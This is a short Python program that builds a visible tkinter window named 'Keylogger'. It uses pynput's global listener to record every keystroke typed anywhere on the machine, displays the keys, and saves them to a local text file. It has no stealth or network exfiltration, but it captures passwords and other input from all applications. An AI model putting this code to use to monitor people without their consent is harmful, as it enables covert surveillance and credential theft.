#gauravrokade2002
#key logger

import tkinter as tk
from tkinter import scrolledtext
from tkinter import filedialog
from pynput import keyboard

class KeyloggerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger")

        self.is_logging = False
        self.keylogger = None

        # Create GUI elements
        self.start_button = tk.Button(root, text="Start Logging", command=self.start_logging)
        self.start_button.pack(pady=5)

        self.stop_button = tk.Button(root, text="Stop Logging", command=self.stop_logging, state=tk.DISABLED)
        self.stop_button.pack(pady=5)

        self.save_button = tk.Button(root, text="Save Log", command=self.save_log, state=tk.DISABLED)
        self.save_button.pack(pady=5)

        self.quit_button = tk.Button(root, text="Quit", command=root.quit)
        self.quit_button.pack(pady=5)

        # Text widget for displaying keystrokes
        self.text_area = scrolledtext.ScrolledText(root, width=50, height=20)
        self.text_area.pack(pady=10)

    def start_logging(self):
        if not self.is_logging:
            self.is_logging = True
            self.start_button.config(state=tk.DISABLED)
            self.stop_button.config(state=tk.NORMAL)
            self.save_button.config(state=tk.DISABLED)
            self.text_area.delete(1.0, tk.END)  # Clear text area
            self.keylogger = keyboard.Listener(on_press=self.on_press)
            self.keylogger.start()
            print("Keylogging started.")

    def stop_logging(self):
        if self.is_logging:
            self.is_logging = False
            self.start_button.config(state=tk.NORMAL)
            self.stop_button.config(state=tk.DISABLED)
            self.save_button.config(state=tk.NORMAL)
            self.keylogger.stop()
            print("Keylogging stopped.")

    def save_log(self):
        log_content = self.text_area.get(1.0, tk.END)
        if log_content.strip():  # Check if there's anything to save
            file_path = filedialog.asksaveasfilename(defaultextension=".txt",
                                                   filetypes=[("Text files", "*.txt"),
                                                              ("All files", "*.*")])
            if file_path:
                with open(file_path, "w") as file:
                    file.write(log_content)
                print(f"Log saved to {file_path}")

    def on_press(self, key):
        try:
            key_str = f"{key.char}"
        except AttributeError:
            key_str = f"{key}"
        self.text_area.insert(tk.END, key_str)
        self.text_area.yview(tk.END)  # Scroll to the end of the text area

if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerApp(root)
    root.mainloop()
